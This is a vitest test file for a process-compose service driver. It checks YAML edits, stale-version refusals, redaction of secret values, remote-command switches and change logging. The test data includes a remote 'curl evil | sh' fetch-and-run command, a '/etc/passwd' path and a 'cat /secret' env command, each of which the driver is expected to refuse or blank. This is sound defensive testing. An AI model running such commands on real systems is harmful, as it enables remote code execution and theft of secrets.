import { createHash } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { acknowledgeFiles, controlService, listServices, putService, removeService, serviceLogs, type Machine } from '../src/compose.js';
import { REMOTE_COMMANDS_OFF } from '../src/switches.js';

/*
 * #38277 slice 1: the process-compose driver. Each block proves one of @cto's
 * rules for it; the names say which.
 */

interface Seen { method: string; url: string; token: string | undefined }

let dir: string;
let local: string;
let base: string;
let server: Server;
let seen: Seen[];
/** What the fake process-compose answers, by "METHOD url"; anything else is 200 {name}. */
let answers: Map<string, [number, unknown]>;
let machine: Machine;

const LOCAL_ONLY = { principal: 'local:bjorn', remote: false };
const REMOTE = { principal: 'plugin:hightea-pipe', remote: true };
const sha = (text: string | Buffer): string => createHash('sha256').update(text).digest('hex');
const read = (): string => readFileSync(local, 'utf8');
const logLines = (): Array<Record<string, unknown>> =>
  readFileSync(machine.changeLog, 'utf8').trim().split('\n').map((line) => JSON.parse(line) as Record<string, unknown>);
const version = (): string => {
  const listing = listServices(machine);
  if (!listing.ok) throw new Error(listing.message);
  return listing.ifVersion;
};

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), 'ahpd-services-'));
  local = join(dir, 'local.yaml');
  base = join(dir, 'base.yaml');
  writeFileSync(base, 'version: "0.5"\nprocesses: {}\n');
  writeFileSync(join(dir, 'token'), 'a-token-of-twenty-chars-or-more\n');
  seen = [];
  answers = new Map();
  server = createServer((req, res) => {
    seen.push({ method: req.method!, url: req.url!, token: req.headers['x-pc-token-key'] as string | undefined });
    const [status, body] = answers.get(`${req.method} ${req.url}`) ?? [200, { name: 'ok' }];
    res.writeHead(status, { 'content-type': 'application/json' }).end(JSON.stringify(body));
  });
  const socket = join(dir, 'pc.sock');
  await new Promise<void>((done) => server.listen(socket, done));
  machine = {
    name: 'test-machine',
    files: [base, local],
    configDir: dir,
    changeLog: join(dir, 'changes.jsonl'),
    pc: { socket, tokenFile: join(dir, 'token') },
  };
});
afterEach(async () => {
  await new Promise<void>((done) => server.close(() => done()));
  rmSync(dir, { recursive: true, force: true });
});

/** The changed region between two texts: what the old one had there and what the new one has. */
const changedRegion = (before: string, after: string): { at: number; was: string; now: string } => {
  let head = 0;
  while (head < before.length && before[head] === after[head]) head += 1;
  let tail = 0;
  while (tail < before.length - head && tail < after.length - head && before[before.length - 1 - tail] === after[after.length - 1 - tail]) tail += 1;
  return { at: head, was: before.slice(head, before.length - tail), now: after.slice(head, after.length - tail) };
};

const HAND_WRITTEN = `# machine-local services, written by hand
version: "0.5"
log_location: /var/log/pc.log
x-team: {owner: ops, pager: [a, b]}
processes:
  web:
    command: "node server.js"   # keep this comment
    namespace: frontend
    log_location: ./web.log
    x-foo: {bar: 1, baz: [a, b]}
    availability:
        restart: on_failure     # odd indentation
        exit_on_end: true
    readiness_probe:
      exec:
        command: curl -f localhost:3000
      initial_delay_seconds: 5

  worker:
     command: 'python  worker.py'
     working_dir:    /srv/worker
     is_daemon: false
# trailing comment at the end
`;

describe('an edit changes only the neutral field it carries (rule: every other byte stays)', () => {
  beforeEach(() => { writeFileSync(local, HAND_WRITTEN); });

  it('reads the neutral record and leaves native fields out of it', () => {
    const listing = listServices(machine);
    expect(listing.ok).toBe(true);
    if (!listing.ok) return;
    expect(listing.services).toEqual([
      { name: 'web', command: 'node server.js', restart: { policy: 'on_failure' }, health: { exec: 'curl -f localhost:3000' } },
      { name: 'worker', command: 'python  worker.py', cwd: '/srv/worker' },
    ]);
    expect(listing.readOnly).toEqual([]);
    expect(listing.ifVersion).toBe(sha(HAND_WRITTEN));
    expect(listing.file).toBe(local);
    expect(listing.capabilities).toMatchObject({ schedule: ['cron', 'interval'], missedRunCatchup: false });
    expect(listing.capabilities.fields).toContain('health');
  });

  it('a command change rewrites only that scalar, keeping its quoting; namespace, log_location, x-foo and comments survive', async () => {
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'web', command: 'node server.js --port 4000' }, ifVersion: sha(HAND_WRITTEN) });
    expect(answer).toMatchObject({ ok: true, changed: true });
    const after = read();
    expect(changedRegion(HAND_WRITTEN, after)).toEqual({ at: HAND_WRITTEN.indexOf('"node server.js"') + 15, was: '', now: ' --port 4000' });
    expect(after).toBe(HAND_WRITTEN.replace('"node server.js"', '"node server.js --port 4000"'));
    if (answer.ok) expect(answer.ifVersion).toBe(sha(after));
  });

  it('a restart policy change keeps the odd indentation, the comment and exit_on_end', async () => {
    await putService(machine, LOCAL_ONLY, { service: { name: 'web', restart: { policy: 'always' } }, ifVersion: sha(HAND_WRITTEN) });
    expect(read()).toBe(HAND_WRITTEN.replace('restart: on_failure     #', 'restart: always     #'));
  });

  it('a new field is inserted as whole lines at the entry\'s indentation, and nothing else moves', async () => {
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'worker', schedule: { cron: '*/5 * * * *', timezone: 'UTC' } }, ifVersion: sha(HAND_WRITTEN) });
    expect(answer.ok).toBe(true);
    expect(read()).toBe(HAND_WRITTEN.replace('     is_daemon: false\n', '     is_daemon: false\n     schedule:\n       cron: "*/5 * * * *"\n       timezone: UTC\n'));
    const listing = listServices(machine);
    expect(listing.ok && listing.services.find((one) => one.name === 'worker')).toEqual({
      name: 'worker', command: 'python  worker.py', cwd: '/srv/worker', schedule: { cron: '*/5 * * * *', timezone: 'UTC' },
    });
  });

  it('switching the readiness check from exec to http keeps the probe\'s native timing', async () => {
    await putService(machine, LOCAL_ONLY, { service: { name: 'web', health: { http: { port: 3000, path: '/health' } } }, ifVersion: sha(HAND_WRITTEN) });
    expect(read()).toBe(HAND_WRITTEN.replace(
      '      exec:\n        command: curl -f localhost:3000\n      initial_delay_seconds: 5\n',
      '      initial_delay_seconds: 5\n      http_get:\n        port: 3000\n        path: /health\n',
    ));
  });

  it('a new entry is appended at the end of processes, and remove takes only its lines', async () => {
    const added = await putService(machine, LOCAL_ONLY, { service: { name: 'cron-job', command: 'backup --all', restart: { policy: 'no' } }, ifVersion: sha(HAND_WRITTEN) });
    expect(added.ok).toBe(true);
    const withNew = read();
    expect(withNew).toBe(HAND_WRITTEN.replace(
      '     is_daemon: false\n',
      '     is_daemon: false\n  cron-job:\n    command: backup --all\n    availability:\n      restart: no\n',
    ));
    const removed = await removeService(machine, LOCAL_ONLY, { name: 'cron-job', ifVersion: sha(withNew) });
    expect(removed.ok).toBe(true);
    expect(read()).toBe(HAND_WRITTEN);
  });

  it('a put that changes nothing writes nothing and does not reload', async () => {
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'web', command: 'node server.js' }, ifVersion: sha(HAND_WRITTEN) });
    expect(answer).toMatchObject({ ok: true, changed: false });
    expect(read()).toBe(HAND_WRITTEN);
    expect(seen).toEqual([]);
  });
});

describe('ifVersion (rule: a stale write is refused with the difference, never merged)', () => {
  it('refuses a put made against an older version, shows what changed, and leaves the file as it is', async () => {
    writeFileSync(local, 'processes:\n  web:\n    command: one\n');
    const read1 = version();
    const edited = 'processes:\n  web:\n    command: two   # someone on the machine\n';
    writeFileSync(local, edited);
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'web', cwd: '/srv' }, ifVersion: read1 });
    expect(answer).toMatchObject({ ok: false, code: 'STALE_VERSION' });
    if (answer.ok) return;
    expect(answer.diff).toContain('-    command: one');
    expect(answer.diff).toContain('+    command: two   # someone on the machine');
    expect(answer.message).toContain(sha(edited));
    expect(read()).toBe(edited);
    expect(seen).toEqual([]);
  });

  it('refuses a remove against another version too', async () => {
    writeFileSync(local, 'processes:\n  web:\n    command: one\n');
    const answer = await removeService(machine, LOCAL_ONLY, { name: 'web', ifVersion: sha('something else') });
    expect(answer).toMatchObject({ ok: false, code: 'STALE_VERSION' });
    expect(read()).toBe('processes:\n  web:\n    command: one\n');
  });

  // @cto 7af7ed84: hand-written plain environment values may be secrets, and the diff goes off the machine.
  it('answers a remote caller a diff with every plain environment value blanked, and logs only the blanked diff', async () => {
    const before = 'processes:\n  web:\n    command: one\n    environment:\n      - DB_PASSWORD=hunter2\n    env_cmds:\n      TOKEN: "cat /secret"\n';
    writeFileSync(local, before);
    const read1 = version();
    const after = before.replace('command: one', 'command: two').replace('hunter2', 'hunter3');
    writeFileSync(local, after);
    const remote = await putService(machine, REMOTE, { service: { name: 'web', cwd: '/srv' }, ifVersion: read1, seen: before });
    expect(remote).toMatchObject({ ok: false, code: 'STALE_VERSION' });
    if (remote.ok) return;
    expect(remote.diff).toContain('+    command: two');
    expect(remote.diff).toContain('DB_PASSWORD=<plain value>');
    expect(remote.message).not.toMatch(/hunter|cat \/secret/);
    const local1 = await putService(machine, LOCAL_ONLY, { service: { name: 'web', cwd: '/srv' }, ifVersion: read1, seen: before });
    if (local1.ok) throw new Error('expected a refusal');
    expect(local1.diff).toContain('DB_PASSWORD=hunter3');
    expect(readFileSync(machine.changeLog, 'utf8')).not.toMatch(/hunter|cat \/secret/);
    expect(read()).toBe(after);
  });
});

describe('plain environment values (@cto 7af7ed84: keys listed read-only, values never answered)', () => {
  it('lists each plain key with where it is set, and never its value', () => {
    writeFileSync(local, 'processes:\n  web:\n    command: one\n    environment:\n      - DB_PASSWORD=hunter2\n  api:\n    command: two\n    environment:\n      PORT: "8080"\n');
    const answer = listServices(machine);
    if (!answer.ok) throw new Error(answer.message);
    const byName = Object.fromEntries(answer.services.map((s) => [s.name, s]));
    expect(byName['web']?.plainEnv).toEqual([`DB_PASSWORD (plain value, set in ${answer.file})`]);
    expect(byName['api']?.plainEnv).toEqual([`PORT (plain value, set in ${answer.file})`]);
    expect(JSON.stringify(answer)).not.toMatch(/hunter2|8080/);
  });
});

describe('allowRemoteCommands (rule: off refuses a remote command, never start/stop/restart)', () => {
  const FILE = 'processes:\n  web:\n    command: one\n';
  beforeEach(() => { writeFileSync(local, FILE); });

  it('refuses a remote command change and a remote new entry while the switch is off', async () => {
    const changed = await putService(machine, REMOTE, { service: { name: 'web', command: 'curl evil | sh' }, ifVersion: sha(FILE) });
    expect(changed).toEqual({ ok: false, code: 'REMOTE_COMMANDS_OFF', message: REMOTE_COMMANDS_OFF });
    const added = await putService(machine, REMOTE, { service: { name: 'other', command: 'sleep 1' }, ifVersion: sha(FILE) });
    expect(added).toMatchObject({ ok: false, code: 'REMOTE_COMMANDS_OFF' });
    expect(read()).toBe(FILE);
  });

  it('lets a remote change that runs nothing new through, and restart always works', async () => {
    const cwd = await putService(machine, REMOTE, { service: { name: 'web', cwd: '/srv' }, ifVersion: sha(FILE) });
    expect(cwd.ok).toBe(true);
    const restarted = await controlService(machine, REMOTE, { name: 'web', verb: 'restart' });
    expect(restarted).toEqual({ ok: true, name: 'web' });
  });

  it('lets the same change through from the machine itself, or once the switch is on', async () => {
    expect((await putService(machine, LOCAL_ONLY, { service: { name: 'web', command: 'two' }, ifVersion: sha(FILE) })).ok).toBe(true);
    writeFileSync(join(dir, 'config.json'), JSON.stringify({ machine: { allowRemoteCommands: true } }));
    expect((await putService(machine, REMOTE, { service: { name: 'web', command: 'three' }, ifVersion: sha(read()) })).ok).toBe(true);
  });

  it('refuses with the switch file\'s own message when it cannot be read, never treating it as on or off', async () => {
    writeFileSync(join(dir, 'config.json'), '{ not json');
    const answer = await putService(machine, REMOTE, { service: { name: 'web', command: 'two' }, ifVersion: sha(FILE) });
    expect(answer).toMatchObject({ ok: false, code: 'SWITCHES_UNREADABLE' });
    if (!answer.ok) expect(answer.message).toMatch(/config\.json is not JSON/);
    expect(read()).toBe(FILE);
  });
});

describe('read-only entries (rule: what the driver cannot round-trip is listed with where to edit it)', () => {
  it('names earlier -f files, anchors, merge keys, extends, templating and a bare $secret', async () => {
    writeFileSync(base, 'processes:\n  shared:\n    command: base-version\n  baseonly:\n    command: x\n');
    const text = `x-common: &common
  working_dir: /srv
processes:
  shared:
    command: local-override
  merged:
    <<: *common
    command: m
  anchored: &anch
    command: a
  extended:
    extends: anchored
    command: e
  templated:
    command: "run {{.PORT}}"
  baresecret:
    command: run
    environment:
      - 'TOKEN={"$secret":"hightea:token"}'
  fine:
    command: ok
`;
    writeFileSync(local, text);
    const listing = listServices(machine);
    expect(listing.ok).toBe(true);
    if (!listing.ok) return;
    expect(listing.services.map((one) => one.name)).toEqual(['fine']);
    const reasons = Object.fromEntries(listing.readOnly.map((one) => [one.name, one.reason]));
    expect(reasons).toEqual({
      shared: `it is also defined in ${base}; edit it in ${base} on test-machine`,
      baseonly: `it is defined in ${base}; edit it in ${base} on test-machine`,
      merged: `it uses YAML anchors, aliases or merge keys; edit it in ${local} on test-machine`,
      anchored: `it uses YAML anchors, aliases or merge keys; edit it in ${local} on test-machine`,
      extended: `it uses extends; edit it in ${local} on test-machine`,
      templated: `it uses templated values; edit it in ${local} on test-machine`,
      baresecret: `it uses $secret without the ahpd secrets wrapper; edit it in ${local} on test-machine`,
    });
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'shared', command: 'new' }, ifVersion: sha(text) });
    expect(answer).toMatchObject({ ok: false, code: 'READ_ONLY' });
    const gone = await removeService(machine, LOCAL_ONLY, { name: 'baseonly', ifVersion: sha(text) });
    expect(gone).toMatchObject({ ok: false, code: 'READ_ONLY' });
    expect(read()).toBe(text);
  });
});

describe('env (rule: secret references only; the wrapper carries them)', () => {
  const FILE = 'processes:\n  web:\n    command: one\n';
  beforeEach(() => { writeFileSync(local, FILE); });

  it('refuses a plain value by name, without echoing it, and writes nothing', async () => {
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'web', env: { API_KEY: 'hunter2' as never } }, ifVersion: sha(FILE) });
    expect(answer).toMatchObject({ ok: false, code: 'PLAIN_ENV_VALUE' });
    if (!answer.ok) {
      expect(answer.message).toContain('API_KEY');
      expect(answer.message).not.toContain('hunter2');
    }
    expect(read()).toBe(FILE);
    expect(readFileSync(machine.changeLog, 'utf8')).not.toContain('hunter2');
  });

  it('writes references as the wrapper command and reads them back as command and env', async () => {
    const answer = await putService(machine, LOCAL_ONLY, {
      service: { name: 'web', command: "echo 'hi' && serve", env: { API_KEY: { $secret: 'hightea:api-key' } } }, ifVersion: sha(FILE),
    });
    expect(answer.ok).toBe(true);
    expect((parse(read()) as { processes: { web: { command: string } } }).processes.web.command)
      .toBe(`ahpd secrets exec web --env API_KEY=hightea:api-key -- 'echo '\\''hi'\\'' && serve'`);
    expect(read()).not.toContain('{"$secret"');
    const listing = listServices(machine);
    expect(listing.ok && listing.services).toEqual([{ name: 'web', command: "echo 'hi' && serve", env: { API_KEY: { $secret: 'hightea:api-key' } } }]);
  });
});

describe('the change log (rule: every change and every refusal is one JSON line, 0600)', () => {
  it('logs a change with both records and both hashes, and a refusal with its code', async () => {
    const FILE = 'processes:\n  web:\n    command: one\n';
    writeFileSync(local, FILE);
    await putService(machine, REMOTE, { service: { name: 'web', cwd: '/srv' }, ifVersion: sha(FILE) });
    await putService(machine, REMOTE, { service: { name: 'web', command: 'two' }, ifVersion: sha(read()) });
    const [change, refusal] = logLines();
    expect(change).toMatchObject({
      principal: 'plugin:hightea-pipe', op: 'put', name: 'web',
      before: { name: 'web', command: 'one' }, after: { name: 'web', command: 'one', cwd: '/srv' },
      fileHashBefore: sha(FILE), fileHashAfter: sha(read()),
    });
    expect(change).not.toHaveProperty('refused');
    expect(typeof change!['at']).toBe('string');
    expect(refusal).toMatchObject({ op: 'put', name: 'web', refused: { code: 'REMOTE_COMMANDS_OFF' }, fileHashBefore: sha(read()), fileHashAfter: sha(read()) });
    expect(statSync(machine.changeLog).mode & 0o777).toBe(0o600);
  });

  it('refuses before changing anything when the change log cannot be appended to', async () => {
    const FILE = 'processes:\n  web:\n    command: one\n';
    writeFileSync(local, FILE);
    const answer = await putService({ ...machine, changeLog: join(dir, 'missing', 'changes.jsonl') }, LOCAL_ONLY, { service: { name: 'web', command: 'two' }, ifVersion: sha(FILE) });
    expect(answer).toMatchObject({ ok: false, code: 'CHANGE_LOG_UNWRITABLE' });
    expect(read()).toBe(FILE);
  });
});

describe('process-compose over its Unix socket (rule: reload from disk; one route per verb)', () => {
  const FILE = 'processes:\n  web:\n    command: one\n';
  beforeEach(() => { writeFileSync(local, FILE); });

  it('reloads with POST /project/configuration and the token header after a write', async () => {
    await putService(machine, LOCAL_ONLY, { service: { name: 'web', command: 'two' }, ifVersion: sha(FILE) });
    expect(seen).toEqual([{ method: 'POST', url: '/project/configuration', token: 'a-token-of-twenty-chars-or-more' }]);
  });

  it('starts, stops, restarts and reads logs on their routes', async () => {
    answers.set('GET /process/logs/web/0/50', [200, { logs: ['a', 'b'] }]);
    expect(await controlService(machine, REMOTE, { name: 'web', verb: 'start' })).toEqual({ ok: true, name: 'web' });
    expect(await controlService(machine, REMOTE, { name: 'web', verb: 'stop' })).toEqual({ ok: true, name: 'web' });
    expect(await controlService(machine, REMOTE, { name: 'web', verb: 'restart' })).toEqual({ ok: true, name: 'web' });
    expect(await serviceLogs(machine, REMOTE, { name: 'web', limit: 50 })).toEqual({ ok: true, name: 'web', lines: ['a', 'b'] });
    expect(seen.map((one) => `${one.method} ${one.url}`)).toEqual([
      'POST /process/start/web', 'PATCH /process/stop/web', 'POST /process/restart/web', 'GET /process/logs/web/0/50',
    ]);
    expect(logLines().map((line) => line['op'])).toEqual(['start', 'stop', 'restart']);
  });

  it('returns a reload failure as a refusal naming it, and logs it', async () => {
    answers.set('POST /project/configuration', [400, { error: 'process web2 depends on missing' }]);
    const answer = await putService(machine, LOCAL_ONLY, { service: { name: 'web', command: 'two' }, ifVersion: sha(FILE) });
    expect(answer).toMatchObject({ ok: false, code: 'RELOAD_FAILED' });
    if (!answer.ok) expect(answer.message).toMatch(/written to .* but not applied: process-compose answered 400: process web2 depends on missing/);
    expect(logLines().at(-1)).toMatchObject({ refused: { code: 'RELOAD_FAILED' }, fileHashAfter: sha(read()) });
  });

  it('answers a refusal, never a throw, when process-compose is not there', async () => {
    const away = { ...machine, pc: { socket: join(dir, 'nobody.sock') } };
    const answer = await controlService(away, LOCAL_ONLY, { name: 'web', verb: 'start' });
    expect(answer).toMatchObject({ ok: false, code: 'PC_REFUSED' });
    if (!answer.ok) expect(answer.message).toContain('nobody.sock');
  });
});

describe('refusals, never throws (@cto: the condition for running inside ahpd)', () => {
  it('answers malformed requests and a missing file with refusal objects', async () => {
    writeFileSync(local, 'processes:\n  web:\n    command: one\n');
    expect(await putService(machine, LOCAL_ONLY, undefined as never)).toMatchObject({ ok: false, code: 'INVALID' });
    expect(await putService(machine, LOCAL_ONLY, { service: { name: 'web', log_location: 'x' } as never, ifVersion: 'x' }))
      .toMatchObject({ ok: false, code: 'INVALID', message: expect.stringContaining('"log_location" is not a service field') as unknown });
    expect(await removeService(machine, LOCAL_ONLY, { name: 'nobody', ifVersion: 'x' })).toMatchObject({ ok: false, code: 'NOT_FOUND' });
    expect(await controlService(machine, LOCAL_ONLY, { name: 'web', verb: 'kill' as never })).toMatchObject({ ok: false, code: 'INVALID' });
    const missing = { ...machine, files: [join(dir, 'absent.yaml')] };
    expect(listServices(missing)).toMatchObject({ ok: false, code: 'FILE_UNREADABLE' });
    expect(await putService(missing, LOCAL_ONLY, { service: { name: 'web', command: 'two' }, ifVersion: 'x' })).toMatchObject({ ok: false, code: 'FILE_UNREADABLE' });
  });
});

describe('acknowledge (@cto 876bcedd: pinned to the hashes shown, logged, changes nothing running)', () => {
  it('records every -f file as list showed it, logs who and which hashes, and touches neither the files nor process-compose', async () => {
    writeFileSync(local, 'processes:\n  web:\n    command: edited-by-hand\n');
    const listing = listServices(machine);
    if (!listing.ok) throw new Error(listing.message);
    expect(Object.keys(listing.hashes)).toEqual([base, local]);
    const recorded: Array<[string, string]> = [];
    const before = readFileSync(local, 'utf8');
    seen = [];
    const answer = acknowledgeFiles(machine, REMOTE, { hashes: listing.hashes }, (file, hash) => recorded.push([file, hash]));
    expect(answer).toEqual({ ok: true, files: listing.hashes });
    expect(recorded).toEqual(Object.entries(listing.hashes));
    expect(readFileSync(local, 'utf8')).toBe(before);
    expect(seen).toEqual([]);
    const line = JSON.parse(readFileSync(machine.changeLog, 'utf8').trim().split('\n').at(-1)!) as Record<string, unknown>;
    expect(line).toMatchObject({ principal: 'plugin:hightea-pipe', op: 'acknowledge', files: listing.hashes });
    expect(line['refused']).toBeUndefined();
  });

  it('refuses a file changed since it was shown, with the difference blanked for a remote caller, and records nothing', () => {
    writeFileSync(local, 'processes:\n  web:\n    command: one\n    environment:\n      - DB_PASSWORD=hunter2\n');
    const shown = listServices(machine);
    if (!shown.ok) throw new Error(shown.message);
    writeFileSync(local, 'processes:\n  web:\n    command: two\n    environment:\n      - DB_PASSWORD=hunter3\n');
    const recorded: string[] = [];
    const remote = acknowledgeFiles(machine, REMOTE, { hashes: shown.hashes }, (file) => recorded.push(file));
    expect(remote).toMatchObject({ ok: false, code: 'STALE_VERSION' });
    if (remote.ok) return;
    expect(remote.diff).toContain('+    command: two');
    expect(remote.message).not.toMatch(/hunter/);
    const person = acknowledgeFiles(machine, LOCAL_ONLY, { hashes: shown.hashes }, (file) => recorded.push(file));
    if (person.ok) throw new Error('expected a refusal');
    expect(person.diff).toContain('DB_PASSWORD=hunter3');
    expect(recorded).toEqual([]);
    expect(readFileSync(machine.changeLog, 'utf8')).not.toMatch(/hunter/);
  });

  it('refuses no hashes, or a file that is not one of the -f files, by name', () => {
    expect(acknowledgeFiles(machine, LOCAL_ONLY, { hashes: {} }, () => {})).toMatchObject({ ok: false, code: 'INVALID', message: expect.stringContaining('acknowledge needs "hashes"') });
    expect(acknowledgeFiles(machine, LOCAL_ONLY, { hashes: { '/etc/passwd': 'x' } }, () => {})).toMatchObject({ ok: false, code: 'INVALID', message: expect.stringContaining('/etc/passwd is not one of this machine\'s -f files') });
  });
});
